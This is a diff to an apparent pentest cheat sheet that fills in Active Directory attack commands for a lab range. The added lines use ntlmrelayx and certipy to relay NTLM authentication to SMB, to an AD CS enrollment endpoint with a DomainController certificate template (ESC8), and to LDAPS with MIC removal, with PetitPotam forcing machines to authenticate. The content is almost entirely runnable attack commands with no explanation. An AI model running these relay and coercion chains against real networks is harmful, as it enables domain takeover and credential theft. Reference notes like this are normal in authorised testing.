@@ -648,11 +648,21 @@ lookupsid.py
 
 ### Store SOCKS Sessions
 ```
+ntlmrelayx.py -t 192.168.86.182 -smb2support -socks
+
+python3 PetitPotam.py 192.168.86.193 192.168.86.183
 ```
 
 ### Request User Certificate
 ```
+# certipy
+certipy relay -ca ca01.range.net -template 'DomainController'
 
+# impacket
+ntlmrelayx.py -t http://ca01.range.net/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
+
+# coerce with 
+python3 PetitPotam.py 192.168.86.193 192.168.86.182
 ```
 
 ### ESC8
@@ -665,6 +675,9 @@ lookupsid.py
 
 ### NetNTLMv1 to LDAP
 ```
+ntlmrelayx.py -t ldaps://ca01.range.net -smb2support --remove-mic -i
+
+python3 PetitPotam.py 192.168.86.193 192.168.86.182
 ```
 
 ### Relay Notes
